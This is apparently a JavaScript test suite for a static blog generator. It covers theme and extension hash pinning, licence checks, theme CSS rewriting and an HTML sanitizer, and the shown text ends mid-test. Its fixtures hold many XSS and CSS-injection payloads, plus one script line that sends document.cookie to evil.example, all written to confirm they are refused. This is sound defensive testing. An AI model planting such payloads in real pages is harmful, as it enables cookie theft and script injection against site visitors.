import test from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import { promises as fs } from 'node:fs';
import path from 'node:path';
import { sha256, sha256Bytes } from '../lib/sha256.js';
import { isPinnedRef, validatePin } from '../lib/pin.js';
import { checkLicence, normaliseGpl, splitLicensingLanguage } from '../lib/licence.js';
import { loadTheme, pinFor, processThemeCss, themeDigest, themeFilePaths, tokensCss, validateThemeManifest } from '../lib/theme-pack.js';
import { loadExtension, pinForExtension, validateExtensionManifest, extensionFilePaths, makeHooks, isPinnedUrl } from '../lib/extensions.js';
import { sanitizeHtml } from '../lib/sanitize.js';
import { buildSite, validateBlog } from '../lib/blog.js';
import { buildSiteWith } from '../lib/build-async.js';
import { EX, localRunner, readDirFiles, stripData } from './helpers.js';

const enc = new TextEncoder();
const code = (fn) => (e) => {
  if (e.code === undefined) console.error(e);
  return e.code === fn;
};

// ---------- fixtures: pinned packs ----------
async function pinnedTheme(dir, ref = 'v1.0.0', repo = 'me/theme') {
  const files = await readDirFiles(path.join(EX, dir));
  const manifest = JSON.parse(new TextDecoder().decode(files['theme.json']));
  const digest = themeDigest(files, themeFilePaths(manifest));
  const pin = pinFor(repo, ref, manifest, digest);
  return { files, manifest, pin, theme: loadTheme(pin, files) };
}
async function pinnedExt(dir = 'ext-reading-time', ref = 'v1.0.0', repo = 'me/ext') {
  const files = await readDirFiles(path.join(EX, dir));
  const manifest = JSON.parse(new TextDecoder().decode(files['extension.json']));
  const digest = (await import('../lib/pin.js')).filesDigest(files, extensionFilePaths(manifest), (m) => new Error(m));
  const pin = pinForExtension(repo, ref, manifest, digest);
  return { files, manifest, pin, ext: loadExtension(pin, files) };
}
const exampleInput = async (patch = {}) => {
  const blog = JSON.parse(await fs.readFile(path.join(EX, 'blog', 'blog.json'), 'utf8'));
  Object.assign(blog, patch);
  const lock = JSON.parse(await fs.readFile(path.join(EX, 'blog', 'assets.lock.json'), 'utf8'));
  const posts = await Promise.all(['static-hls-in-git', 'markdown-is-the-format'].map(async (s) => ({ path: `posts/${s}.md`, text: await fs.readFile(path.join(EX, 'blog', 'posts', `${s}.md`), 'utf8') })));
  return { blog: JSON.stringify(blog), lock, posts };
};

test('sha256: the synchronous implementation matches node:crypto', () => {
  for (const n of [0, 1, 55, 56, 63, 64, 65, 1000, 70000]) {
    const b = crypto.randomBytes(n);
    assert.equal(sha256Bytes(b), crypto.createHash('sha256').update(b).digest('hex'), `length ${n}`);
  }
  assert.equal(sha256('abc'), 'ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad');
  assert.equal(sha256('héllo ✓'), crypto.createHash('sha256').update('héllo ✓').digest('hex'));
});

// ---------- X4: pinned by ref and hash ----------
test('X4: a branch is refused; only a release tag or a commit pins', () => {
  for (const ok of ['v1.2.0', '1.2', 'v2.0.0-rc.1', 'v1.0.0+build5', 'a'.repeat(40).replace(/a/g, 'e')]) assert.ok(isPinnedRef(ok), ok);
  for (const no of ['main', 'master', 'HEAD', 'latest', 'dev', 'develop', 'v1', 'abc1234', 'refs/heads/main', 'feature/x', '', undefined, 'v1.2.x']) assert.ok(!isPinnedRef(no), String(no));
  const good = { repo: 'me/t', ref: 'v1.0.0', sha256: 'a'.repeat(64) };
  assert.doesNotThrow(() => validatePin(good, 'theme'));
  assert.throws(() => validatePin({ ...good, ref: 'main' }, 'theme'), code('unpinned-ref'));
  assert.throws(() => validatePin({ ...good, sha256: 'abc' }, 'theme'), code('bad-blog-json'));
  assert.throws(() => validatePin({ ...good, repo: 'not a repo' }, 'theme'), code('bad-blog-json'));
});

test('X4: content that does not match the pinned sha256 is refused', async () => {
  const { files, pin } = await pinnedTheme('theme-plain');
  assert.doesNotThrow(() => loadTheme(pin, files));
  const css = { ...files, 'style.css': enc.encode(new TextDecoder().decode(files['style.css']) + '\nbody{display:none}') };
  assert.throws(() => loadTheme(pin, css), code('pin-mismatch'));
  const asset = { ...files, 'img/rule.svg': enc.encode('<svg/>') };
  assert.throws(() => loadTheme(pin, asset), code('pin-mismatch'));
  const manifest = { ...files, 'theme.json': enc.encode(new TextDecoder().decode(files['theme.json']).replace('1.0.0', '1.0.1')) };
  assert.throws(() => loadTheme(pin, manifest), code('pin-mismatch'));
  assert.throws(() => loadTheme({ ...pin, ref: 'main' }, files), code('unpinned-ref'));
  assert.throws(() => loadTheme({ ...pin, licence: 'GPL-2.0-or-later' }, files), code('pin-mismatch'), 'the licence recorded in blog.json must match the theme');
  const ext = await pinnedExt();
  assert.throws(() => loadExtension({ ...ext.pin, sha256: '0'.repeat(64) }, ext.files), code('pin-mismatch'));
  assert.throws(() => loadExtension({ ...ext.pin, ref: 'master' }, ext.files), code('unpinned-ref'));
});

// ---------- X5: licences ----------
test('X5: no declared licence is a refusal, for themes, extensions and blog.json pins', async () => {
  assert.throws(() => checkLicence('', 'x'), code('no-licence'));
  assert.throws(() => checkLicence(undefined, 'x'), code('no-licence'));
  assert.throws(() => checkLicence('   ', 'x'), code('no-licence'));
  for (const v of ['none', 'UNLICENSED', 'Proprietary', 'All rights reserved', 'see LICENSE', 'my own licence', 'MIT; but also']) assert.throws(() => checkLicence(v, 'x'), code('bad-licence'), v);
  for (const v of ['MIT', 'GPL-2.0-or-later', 'Apache-2.0', 'MIT OR Apache-2.0', 'GPL-3.0-only WITH Classpath-exception-2.0']) assert.equal(checkLicence(v, 'x'), v);

  const { manifest } = await pinnedTheme('theme-plain');
  const noLicence = { ...manifest, licence: undefined };
  assert.throws(() => validateThemeManifest(noLicence), code('no-licence'));
  assert.throws(() => validateThemeManifest({ ...manifest, licence: 'proprietary' }), code('bad-licence'));
  const e = await pinnedExt();
  const extNo = { ...e.manifest, licence: undefined };
  assert.throws(() => validateExtensionManifest(extNo), code('no-licence'));

  const input = await exampleInput();
  const blog = JSON.parse(input.blog);
  const t = await pinnedTheme('theme-plain');
  const pinNoLicence = { ...t.pin, licence: undefined };
  assert.throws(() => validateBlog({ ...blog, theme: pinNoLicence }), code('no-licence'));
  assert.throws(() => validateBlog({ ...blog, theme: { ...t.pin, licence: 'proprietary' } }), code('bad-licence'));
  assert.throws(() => validateBlog({ ...blog, theme: { ...t.pin, name: undefined } }), code('bad-blog-json'));
});

test('licence text: GPL spellings normalise; split-licensing language is recognised', () => {
  assert.equal(normaliseGpl('GNU General Public License v2 or later'), 'GPL-2.0-or-later');
  assert.equal(normaliseGpl('GPLv2+'), 'GPL-2.0-or-later');
  assert.equal(normaliseGpl('GNU General Public License v3 or later'), 'GPL-3.0-or-later');
  assert.equal(normaliseGpl('GPL-2.0-only'), 'GPL-2.0-only');
  assert.equal(normaliseGpl('GPLv2'), 'GPL-2.0-only');
  assert.equal(normaliseGpl('MIT'), null);
  assert.equal(normaliseGpl('GPL v1'), null);
  for (const bad of [
    'The PHP is GPL; the CSS and images are licensed separately under a commercial licence.',
    'Purchased from ThemeForest under the Regular License.',
    'split licensing applies to assets',
    'CSS, JS and images are proprietary.',
    'Fonts are released under a separate licence.',
    'Not licensed under the GPL: images.',
  ]) assert.ok(splitLicensingLanguage(bad), bad);
  for (const ok of [
    'Twenty Twenty-One is distributed under the terms of the GNU GPL. Bundled: Normalize.css (MIT), Open Sans (SIL OFL), images (CC0).',
    'Images from Unsplash are CC0. Fonts: Inter, SIL Open Font License 1.1.',
    'Copyright 2020 the author. Licensed under GPL v2 or later.',
  ]) assert.equal(splitLicensingLanguage(ok), null, ok);
});

// ---------- theme CSS ----------
const ASSETS = new Set(['img/rule.svg', 'fonts/x.woff2']);
const pin = { repo: 'me/theme/sub', ref: 'v1.0.0', sha256: 'a'.repeat(64) };
const css = (c, file = 'style.css') => processThemeCss(c, { file, assets: ASSETS, pin });

test('theme css: declared files are rewritten to pinned addresses; everything else is refused', () => {
  const out = css('a{background:url(img/rule.svg)} @font-face{font-family:X;src:url("fonts/x.woff2?v=2#f") format("woff2")}');
  assert.ok(out.includes('url("https://cdn.jsdelivr.net/gh/me/theme@v1.0.0/sub/img/rule.svg")'));
  assert.ok(out.includes('url("https://cdn.jsdelivr.net/gh/me/theme@v1.0.0/sub/fonts/x.woff2?v=2#f")'), 'query and fragment are kept');
  assert.ok(css('a{background:url(../img/rule.svg)}', 'css/style.css').includes('sub/img/rule.svg'), 'relative to the css file');
  assert.ok(css('a{background:url(data:image/png;base64,AAAA)}').includes('url("data:image/png;base64,AAAA")'));
  assert.ok(css('a{clip-path:url(#c)}').includes('url("#c")'));
  // inline SVG data images contain "<" and are normal in real themes; they are inert as css images
  const svg = css(`a{background:#fff url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='10' height='10'><polygon points='0,0 10,0 5,5'/></svg>") no-repeat}`);
  assert.ok(svg.includes('url("data:image/svg+xml;utf8,<svg xmlns='), 'kept intact');
  assert.ok(!/<\/style/i.test(svg));
  // a < that is escaped in the css (\3c ) is not a < in the output, so it cannot end the element either
  assert.ok(css('a{content:"\\3c /style"}').includes('\\3c'));
  assert.ok(css('/*c*/ @charset "utf-8"; a{content:"\\f101"} @media (min-width:1px){a{color:red}} @supports (display:grid){a{display:grid}} @keyframes k{from{opacity:0}to{opacity:1}}').includes('\\f101'), 'icon-font escapes in strings are fine');
  const bad = (c, file) => assert.throws(() => css(c, file), code('bad-theme'), c.slice(0, 60));
  bad('a{background:url(https://evil.example/x.png)}');
  bad('a{background:url(//evil.example/x.png)}');
  bad('a{background:url(img/other.png)}');
  bad('a{background:url(../../outside.png)}');
  bad('a{background:url(data:text/html;base64,AAAA)}');
  bad('a{background:url(javascript:alert(1))}');
  bad('@import "https://evil.example/x.css";');
  bad("@import url('x.css');");
  bad('a{background:u\\72l(https://evil.example/x)}');
  bad('a{background:\\75rl(x)}');
  bad('a{background:image-set("a.png" 1x)}');
  bad('a{background:-webkit-image-set(url(img/rule.svg) 1x)}');
  bad('a{width:expression(alert(1))}');
  bad('a{-moz-binding:url(x)}');
  bad('a{behavior:url(x)}');
  bad('@namespace x url(y);');
  bad('@document url-prefix(){a{color:red}}');
  bad('</style><script>alert(1)</script>');
  bad('a{color:red}</STYLE ><img src=x onerror=alert(1)>');
  bad('a{content:"</style"}');
  bad('x'.repeat(800_001));
  bad('a{background:url(  img/rule.svg  extra)}');
});

test('theme tokens: WordPress preset names, conventional slugs mapped to our variables, values validated', () => {
  const t = { colors: { background: '#faf7f0', foreground: '#222', primary: 'rgb(1, 2, 3)', accent: '#abc' }, fontFamilies: { body: 'Georgia, "Times New Roman", serif' }, fontSizes: { large: '1.5rem', fluid: 'clamp(1rem, 2vw, 2rem)' }, spacing: { s: '8px' } };
  const out = tokensCss(t);
  assert.ok(out.startsWith(':root{--wp--preset--color--background:#faf7f0;'));
  for (const piece of ['--wp--preset--font-family--body:Georgia, "Times New Roman", serif', '--wp--preset--font-size--fluid:clamp(1rem, 2vw, 2rem)', '--wp--preset--spacing--s:8px', '--bg:#faf7f0', '--fg:#222', '--link:rgb(1, 2, 3)']) assert.ok(out.includes(piece), piece);
  assert.ok(!/[;{]--accent:/.test(out), 'unconventional slugs are not aliased');
  const base = { name: 'T', version: '1', licence: 'MIT', class_contract: 'blog-webcli-v1', css: ['style.css'] };
  const bad = (tokens) => assert.throws(() => validateThemeManifest({ ...base, tokens }), code('bad-theme'), JSON.stringify(tokens));
  bad({ colors: { x: 'red; } body { display:none' } });
  bad({ colors: { x: 'url(x)' } });
  bad({ colors: { 'Bad Slug': '#fff' } });
  bad({ fontFamilies: { x: 'a; b' } });
  bad({ fontSizes: { x: 'calc(1px + url(x))' } });
  bad({ fontSizes: { x: 'clamp(1rem, url(x), 2rem)' } });
  bad({ shadows: {} });
  bad('nope');
});

test('theme manifest: closed fields, safe paths, a known contract', () => {
  const base = { name: 'T', version: '1', licence: 'MIT', class_contract: 'blog-webcli-v1', css: ['style.css'] };
  assert.doesNotThrow(() => validateThemeManifest(base));
  const bad = (patch) => assert.throws(() => validateThemeManifest({ ...base, ...patch }), (e) => ['bad-theme', 'no-licence', 'bad-licence'].includes(e.code), JSON.stringify(patch));
  bad({ class_contract: 'bootstrap' });
  bad({ class_contract: undefined });
  bad({ css: [] });
  bad({ css: ['../style.css'] });
  bad({ css: ['/etc/style.css'] });
  bad({ css: ['a//b.css'] });
  bad({ css: ['style.txt'] });
  bad({ assets: ['..'] });
  bad({ assets: ['.hidden'] });
  bad({ scripts: ['x.js'] });
  bad({ source: 'http://insecure.example' });
  bad({ name: '' });
  bad({ dropped: { php: 'index.php' } });
});

// ---------- the generator with a theme ----------
test('theme: pages inline its css over the base; theme.css matches; nothing is fetched at read time', async () => {
  const { theme, pin: tp } = await pinnedTheme('theme-plain');
  const input = await exampleInput({ theme: tp });
  const { files, errors } = buildSite({ ...input, theme });
  assert.deepEqual(errors, []);
  const page = files['static-hls-in-git/index.html'];
  assert.ok(page.includes('Plain Paper — a theme') === false, 'comments are stripped from the css');
  assert.ok(page.includes('url("https://cdn.jsdelivr.net/gh/me/theme@v1.0.0/img/rule.svg")'));
  assert.ok(page.includes('--wp--preset--color--primary:#8a3b12'));
  assert.ok(page.includes('.screen-reader-text{'), 'the structural base is always present');
  assert.ok(!page.includes('header.site{display:flex'), 'the default theme is replaced, not layered under');
  assert.equal(files['theme.css'], page.match(/<style>([\s\S]*?)<\/style>/)[1] + '\n');
  assert.ok(!/<script|<link[^>]+rel="stylesheet"|@import/i.test(stripData(page)), 'no script and no external stylesheet');
  // customize still layers on top of a theme
  assert.ok(page.includes('--width:42rem'));
});

test('theme: a pinned theme that was not loaded is refused, never silently skipped', async () => {
  const { pin: tp } = await pinnedTheme('theme-plain');
  const input = await exampleInput({ theme: tp });
  assert.deepEqual(buildSite(input).errors.map((e) => e.code), ['bad-theme']);
  const other = await pinnedTheme('theme-plain', 'v9.9.9');
  assert.deepEqual(buildSite({ ...input, theme: other.theme }).errors.map((e) => e.code), ['bad-theme']);
});

// ---------- X7: the class contract ----------
test('X7: class_contract changes the markup, and a classic theme styles a generated page unmodified', async () => {
  const { theme, pin: tp, files } = await pinnedTheme('theme-classic');
  const input = await exampleInput({ theme: tp });
  const { files: out, errors } = buildSite({ ...input, theme });
  assert.deepEqual(errors, []);
  const post = out['static-hls-in-git/index.html'];
  const index = out['index.html'];

  // every class the theme's selectors name exists in the generated markup (the contract is honoured)
  const cssText = new TextDecoder().decode(files['style.css']);
  const wanted = [...new Set([...cssText.replace(/\/\*[\s\S]*?\*\//g, '').matchAll(/\.([a-z][\w-]*)/gi)].map((m) => m[1]))];
  const classesIn = (html) => new Set([...html.matchAll(/class="([^"]*)"/g)].flatMap((m) => m[1].split(/\s+/)));
  const have = new Set([...classesIn(post), ...classesIn(index)]);
  const missing = wanted.filter((c) => !have.has(c));
  assert.deepEqual(missing, [], `the theme styles classes the generator did not emit: ${missing}`);

  // the shape WordPress themes expect
  for (const piece of ['<body class="post-template-default single single-post postid-', '<div id="page" class="site">', '<header id="masthead" class="site-header has-title-and-tagline has-menu">', '<main id="main" class="site-main">', 'class="entry-title"', '<div class="entry-content">', '<ul id="primary-menu-list" class="menu-wrapper menu">', 'class="entry-header alignwide"', '<footer id="colophon" class="site-footer default-max-width">', 'hentry']) assert.ok(post.includes(piece), `post: ${piece}`);
  for (const piece of ['<body class="home blog">', '<h1 class="site-title">', 'class="entry-summary entry-content"', '<h2 class="entry-title default-max-width"><a href="static-hls-in-git/" rel="bookmark">']) assert.ok(index.includes(piece), `index: ${piece}`);
  assert.ok(!post.includes('class="wrap"'), 'the native wrapper is not emitted');
  // content blocks carry WordPress block classes
  for (const piece of ['class="wp-block-heading"', 'class="wp-block-quote"', 'class="wp-block-code"', 'class="wp-block-list"', 'class="wp-block-image size-large"', 'class="wp-block-embed is-type-video']) assert.ok(post.includes(piece), `content: ${piece}`);

  // the same css against native markup would style nothing: the contract is what makes it work
  const native = buildSite({ ...input, blog: JSON.stringify({ ...JSON.parse(input.blog), theme: undefined }) }).files['static-hls-in-git/index.html'];
  assert.ok(!native.includes('entry-title') && !native.includes('site-header') && !native.includes('hentry'));
  // post ids are stable: adding a post does not renumber another
  const id = /postid-(\d+)/.exec(post)[1];
  const more = { ...input, posts: [...input.posts, { path: 'posts/zzz-new.md', text: '---\nslug: zzz-new\ntitle: New\ndate: 2026-12-01\nstatus: published\n---\n\nHello.\n' }] };
  assert.equal(/postid-(\d+)/.exec(buildSite({ ...more, theme }).files['static-hls-in-git/index.html'])[1], id);
});

test('X7: list options still apply under the classic contract', async () => {
  const { theme, pin: tp } = await pinnedTheme('theme-classic');
  const blog = JSON.parse((await exampleInput()).blog);
  blog.theme = tp;
  blog.customize.list = { excerpts: false, dates: false, tags: false };
  const index = buildSite({ ...(await exampleInput({ theme: tp, customize: blog.customize })), theme }).files['index.html'];
  assert.ok(!index.includes('class="entry-summary entry-content"') && !index.includes('class="entry-meta"') && !index.includes('class="tags-links"') && !index.includes('class="posted-on"'));
});

// ---------- X8: licences in one place ----------
test('X8: every licence a blog depends on is recorded in blog.json, licences.json and each page', async () => {
  const t = await pinnedTheme('theme-classic');
  const e = await pinnedExt();
  const input = await exampleInput({ theme: t.pin, extensions: [e.pin] });
  const result = await buildSiteWith({ ...input, theme: t.theme, extensions: [e.ext] }, localRunner);
  assert.deepEqual(result.errors, []);
  const lic = JSON.parse(result.files['licences.json']);
  assert.deepEqual(lic.dependencies.map((d) => [d.kind, d.name, d.version, d.licence]), [['theme', 'Classic Sample', '1.2.0', 'GPL-2.0-or-later'], ['extension', 'Reading time', '1.0.0', 'MIT']]);
  assert.equal(lic.dependencies[0].source, 'https://example.org/classic-sample/');
  assert.deepEqual(lic.dependencies[0].dropped, { php: ['index.php', 'single.php', 'functions.php'] }, 'what was dropped from an upstream theme is recorded');
  assert.equal(lic.dependencies[0].repo, 'me/theme');
  assert.match(lic.dependencies[0].sha256, /^[0-9a-f]{64}$/);
  for (const f of ['index.html', 'static-hls-in-git/index.html']) {
    const m = /<!--\n([\s\S]*?)\n-->/.exec(result.files[f]);
    assert.ok(m, `${f}: licence comment`);
    assert.match(m[1], /theme: Classic Sample 1\.2\.0 — GPL-2\.0-or-later — me\/theme@v1\.0\.0/);
    assert.match(m[1], /extension: Reading time 1\.0\.0 — MIT — me\/ext@v1\.0\.0/);
    assert.ok(!m[1].includes('--'), 'a comment may not contain --');
  }
  const plain = JSON.parse(buildSite(await exampleInput()).files['licences.json']);
  assert.deepEqual(plain.dependencies, [{ kind: 'theme', name: 'default', licence: 'MIT', builtin: true }]);
});

// ---------- extensions ----------
test('extension manifest: no capabilities exist, an embed declares what it frames, only pinned addresses', () => {
  const base = { name: 'E', version: '1', licence: 'MIT', kind: 'build', hooks: ['post:html'] };
  assert.doesNotThrow(() => validateExtensionManifest({ ...base, capabilities: [] }));
  const bad = (patch) => assert.throws(() => validateExtensionManifest({ ...base, ...patch }), (e) => ['bad-extension', 'no-licence', 'bad-licence'].includes(e.code), JSON.stringify(patch));
  bad({ capabilities: ['network'] });
  bad({ capabilities: ['storage'] });
  bad({ hooks: [] });
  bad({ hooks: ['page:script'] });
  bad({ kind: 'runtime' });
  bad({ entry: '../x.mjs' });
  bad({ entry: 'x.html' });
  bad({ pinned_assets: [{ url: 'https://cdn.jsdelivr.net/gh/a/b@v1.0.0/x.html', sha256: 'a'.repeat(64) }] }); // a build extension frames nothing
  bad({ kind: 'embed' }); // an embed must say what it frames
  bad({ kind: 'embed', pinned_assets: [{ url: 'https://cdn.jsdelivr.net/gh/a/b@main/x.html', sha256: 'a'.repeat(64) }] });
  bad({ kind: 'embed', pinned_assets: [{ url: 'http://cdn.example/x@v1.0.0/x.html', sha256: 'a'.repeat(64) }] });
  bad({ kind: 'embed', pinned_assets: [{ url: 'https://cdn.jsdelivr.net/gh/a/b@v1.0.0/x.html', sha256: 'short' }] });
  assert.doesNotThrow(() => validateExtensionManifest({ ...base, kind: 'embed', pinned_assets: [{ url: 'https://cdn.jsdelivr.net/gh/a/b@v1.0.0/x.html', sha256: 'a'.repeat(64) }] }));
  assert.ok(isPinnedUrl('https://x.example/' + 'a'.repeat(40) + '/embed.html'));
  assert.ok(!isPinnedUrl('https://cdn.jsdelivr.net/gh/a/b@latest/x.html'));
});

test('extensions: outputs are data — the generator reports what is missing and never runs code', async () => {
  const e = await pinnedExt();
  const input = await exampleInput({ extensions: [e.pin] });
  const first = buildSite({ ...input, extensions: [e.ext] });
  assert.deepEqual(first.errors.map((x) => x.code), ['extension-output-missing']);
  assert.deepEqual(first.files, {});
  assert.equal(first.missing.length, 2, 'one per published post');
  assert.deepEqual(new Set(first.missing.map((m) => m.hook)), new Set(['post:html']));
  assert.match(first.missing[0].key, /^[0-9a-f]{64}$/);
  assert.match(first.errors[0].detail, /publish from the editor|Extensions run only when you publish/);

  const done = await buildSiteWith({ ...input, extensions: [e.ext] }, localRunner);
  assert.deepEqual(done.errors, []);
  assert.ok(/<p class="reading-time">\d+ min read<\/p>/.test(done.files['static-hls-in-git/index.html']));
  const rec = JSON.parse(done.files['extension-outputs.json']);
  assert.equal(rec.version, 1);
  assert.equal(Object.keys(rec.outputs).length, 2);
  for (const o of Object.values(rec.outputs)) assert.deepEqual(Object.keys(o).sort(), ['extension', 'hook', 'output']);

  // with the recorded outputs, regeneration is deterministic and runs nothing (what the CLI and CI do)
  const again = buildSite({ ...input, extensions: [e.ext], outputs: rec.outputs });
  assert.deepEqual(again.errors, []);
  assert.deepEqual(again.files, done.files);

  // change a post and its recorded output no longer applies: it is missing again, not reused
  const edited = { ...input, posts: input.posts.map((p) => (p.path.endsWith('static-hls-in-git.md') ? { ...p, text: p.text.replace('HLS is a playlist', 'HLS is a list') } : p)) };
  const stale = buildSite({ ...edited, extensions: [e.ext], outputs: rec.outputs });
  assert.deepEqual(stale.missing.map((m) => m.ctx.slug), ['static-hls-in-git']);
  // and unused entries are pruned from the file on the next full build
  const pruned = await buildSiteWith({ ...edited, extensions: [e.ext], outputs: rec.outputs }, localRunner);
  assert.equal(Object.keys(JSON.parse(pruned.files['extension-outputs.json']).outputs).length, 2);
  assert.ok(!Object.keys(JSON.parse(pruned.files['extension-outputs.json']).outputs).some((k) => k in Object.fromEntries(Object.entries(rec.outputs).filter(([, o]) => o.output.includes('playlist and a pile')))));
});

test('extensions: they run in order, each on the previous output, and a missing step stops the chain', async () => {
  const mk = (name, fn) => ({ pin: { repo: `me/${name}`, ref: 'v1.0.0', sha256: sha256(name) }, digest: sha256(name), manifest: { name, hooks: ['post:html'], kind: 'build' }, source: fn });
  const a = mk('a', null);
  const b = mk('b', null);
  const hooks = makeHooks({ extensions: [a, b], outputs: {} });
  assert.equal(hooks.apply('post:html', '<p>x</p>', { slug: 's' }), '<p>x</p>');
  assert.equal(hooks.missing.length, 1, 'only the first is asked; the second would be asked about output that does not exist yet');
  assert.equal(hooks.missing[0].index, 0);
});

// ---------- X3 and the sanitizer ----------
test('sanitizer: the structural wrappers and link relations the generator itself emits survive; nothing else rides along on rel', () => {
  const classic = '<article class="post hentry"><header class="entry-header alignwide"><h2 class="entry-title"><a href="a/" rel="bookmark">A</a></h2></header><footer class="entry-footer"><span class="tags-links">x</span></footer></article><nav class="n"><main>m</main></nav>';
  assert.equal(sanitizeHtml(classic), classic, 'a pass through the sanitizer leaves the classic list markup as it was');
  assert.equal(sanitizeHtml('<a href="https://x.example/" rel="author bookmark evil">x</a>'), '<a href="https://x.example/" rel="bookmark noopener noreferrer">x</a>', 'unknown tokens are dropped and an absolute link is always noopener noreferrer');
  assert.equal(sanitizeHtml('<a href="https://x.example/" rel="noopener noreferrer">x</a>'), '<a href="https://x.example/" rel="noopener noreferrer">x</a>');
  assert.equal(sanitizeHtml('<a href="a/" rel="evil">x</a>'), '<a href="a/">x</a>');
});

test('sanitizer: allow-listed markup is rebuilt, text is escaped, nothing passes through verbatim', () => {
  assert.equal(sanitizeHtml('<p class="a" id=b>Tom &amp; Jerry <em>say</em> 1 < 2 &lt; 3</p>'), '<p class="a" id="b">Tom &amp; Jerry <em>say</em> 1 &lt; 2 &lt; 3</p>');
  assert.equal(sanitizeHtml('<a href="https://x.example/?a=1&b=2">x</a>'), '<a href="https://x.example/?a=1&amp;b=2" rel="noopener noreferrer">x</a>');
  assert.equal(sanitizeHtml('<img src="https://x.example/a.png" alt="a" data-n=1>'), '<img src="https://x.example/a.png" alt="a" data-n="1">');
  assert.equal(sanitizeHtml('<p>unclosed <strong>bold'), '<p>unclosed <strong>bold</strong></p>');
  assert.equal(sanitizeHtml('</div>stray</span>'), 'stray');
  assert.equal(sanitizeHtml('<font color=red>kept text</font><blink>x</blink>'), 'kept textx', 'unknown tags are dropped, their text kept');
  assert.equal(sanitizeHtml('<!-- c --><!DOCTYPE html><?php x ?>a'), 'a');
  assert.equal(sanitizeHtml('<p style="background:url(x)" data-x="1">s</p>'), '<p data-x="1">s</p>');
  assert.equal(sanitizeHtml('<br/><hr><img src="a.png">'), '<br><hr><img src="a.png">');
  assert.equal(sanitizeHtml('<table><tr><td colspan=2>c</td></tr></table>'), '<table><tr><td colspan="2">c</td></tr></table>');
});

test('sanitizer: hostile constructs are refused, not silently stripped', () => {
  const refused = (h) => assert.throws(() => sanitizeHtml(h), code('unsafe-extension-output'), h.slice(0, 70));
  refused('<script>alert(1)</script>');
  refused('<SCRIPT SRC=//evil.example/x.js></SCRIPT>');
  refused('<p onclick="x()">a</p>');
  refused('<img src=x onerror=alert(1)>');
  refused('<a href="javascript:alert(1)">x</a>');
  refused('<a href="  JaVa\tScRiPt:alert(1)">x</a>');
  refused('<a href="jav&#x09;ascript:alert(1)">x</a>');
  refused('<a href="&#106;avascript:alert(1)">x</a>');
  refused('<a href="data:text/html;base64,AAAA">x</a>');
  refused('<a href="vbscript:x">x</a>');
  refused('<img src="data:image/svg+xml,<svg onload=alert(1)>">');
  refused('<img src="http://insecure.example/a.png">');
  refused('<style>body{display:none}</style>');
  refused('<link rel=stylesheet href=//evil.example/x.css>');
  refused('<meta http-equiv=refresh content="0;url=//evil.example">');
  refused('<base href="//evil.example/">');
  refused('<object data=x></object>');
  refused('<embed src=x>');
  refused('<form action=//evil.example><input name=pw></form>');
  refused('<svg onload=alert(1)></svg>');
  refused('<math><mi>x</mi></math>');
  refused('<template><script>1</script></template>');
  refused('<iframe src="https://evil.example/"></iframe>');
  refused('<iframe srcdoc="<script>1</script>"></iframe>');
  refused('<div formaction=x>a</div>');
});

test('X3: an embed is an iframe the extension declared, with sandbox="allow-scripts" and never allow-same-origin', () => {
  const url = 'https://cdn.jsdelivr.net/gh/me/embed@v1.0.0/chart.html';
  const ok = { iframes: new Set([url]) };
  assert.equal(
    sanitizeHtml(`<iframe src="${url}" sandbox="allow-scripts" title="Chart" width="600" height="300" onload=x></iframe>`.replace(' onload=x', ''), ok),
    `<iframe src="${url}" sandbox="allow-scripts" referrerpolicy="no-referrer" loading="lazy" title="Chart" width="600" height="300"></iframe>`,
  );
  const refused = (h, o = ok) => assert.throws(() => sanitizeHtml(h, o), code('unsafe-extension-output'), h.slice(0, 80));
  refused(`<iframe src="${url}" sandbox="allow-scripts allow-same-origin"></iframe>`);
  refused(`<iframe src="${url}" sandbox="allow-same-origin allow-scripts"></iframe>`);
  refused(`<iframe src="${url}" sandbox="allow-scripts allow-top-navigation"></iframe>`);
  refused(`<iframe src="${url}" sandbox=""></iframe>`);
  refused(`<iframe src="${url}"></iframe>`);
  refused(`<iframe src="${url}" sandbox="allow-scripts" allow="camera; microphone"></iframe>`);
  refused(`<iframe src="${url}x" sandbox="allow-scripts"></iframe>`);
  refused('<iframe src="https://evil.example/" sandbox="allow-scripts"></iframe>');
  refused(`<iframe src="${url}" sandbox="allow-scripts"></iframe>`, { iframes: new Set() });
});

test('extensions: a build extension can never frame anything; an embed may frame only its pinned assets', async () => {
  const mkExt = (kind, assets) => ({ pin: { repo: 'me/x', ref: 'v1.0.0', sha256: 'a'.repeat(64) }, digest: 'd'.repeat(64), manifest: { name: 'X', kind, hooks: ['post:html'], pinned_assets: assets } });
  const url = 'https://cdn.jsdelivr.net/gh/me/embed@v1.0.0/chart.html';
  const frame = `<iframe src="${url}" sandbox="allow-scripts"></iframe>`;
  const run = (ext, output) => {
    const probe = makeHooks({ extensions: [ext], outputs: {} });
    probe.apply('post:html', '<p>x</p>', { slug: 's' });
    const outputs = { [probe.missing[0].key]: { output } };
    return makeHooks({ extensions: [ext], outputs }).apply('post:html', '<p>x</p>', { slug: 's' });
  };
  assert.throws(() => run(mkExt('build', []), frame), code('unsafe-extension-output'));
  assert.match(run(mkExt('embed', [{ url, sha256: 'b'.repeat(64) }]), frame), /sandbox="allow-scripts"/);
  assert.throws(() => run(mkExt('embed', [{ url, sha256: 'b'.repeat(64) }]), frame.replace('allow-scripts', 'allow-scripts allow-same-origin')), code('unsafe-extension-output'));
  assert.throws(() => run(mkExt('build', []), '<script>alert(1)</script>'), (e) => e.code === 'unsafe-extension-output' && /X \(post:html\)/.test(e.detail));
});

test('extensions: output that is hostile, or markdown that cannot be rendered, refuses the build', async () => {
  const e = await pinnedExt();
  const input = await exampleInput({ extensions: [e.pin] });
  const evilRunner = async () => '<p>hi</p><script>fetch("//evil.example?"+document.cookie)</script>';
  const evil = await buildSiteWith({ ...input, extensions: [e.ext] }, evilRunner);
  assert.deepEqual(evil.errors.map((x) => x.code), ['unsafe-extension-output', 'unsafe-extension-output'], 'refused for each post; nothing is written');
  assert.deepEqual(evil.files, {});
  // an extension that rewrites markdown into something the editor format cannot express is refused too
  const mdExt = { ...e.ext, manifest: { ...e.ext.manifest, hooks: ['post:markdown'] } };
  const tableRunner = async () => '| a | b |\n|---|---|\n| 1 | 2 |\n';
  const r = await buildSiteWith({ ...input, extensions: [mdExt] }, tableRunner).catch((x) => x);
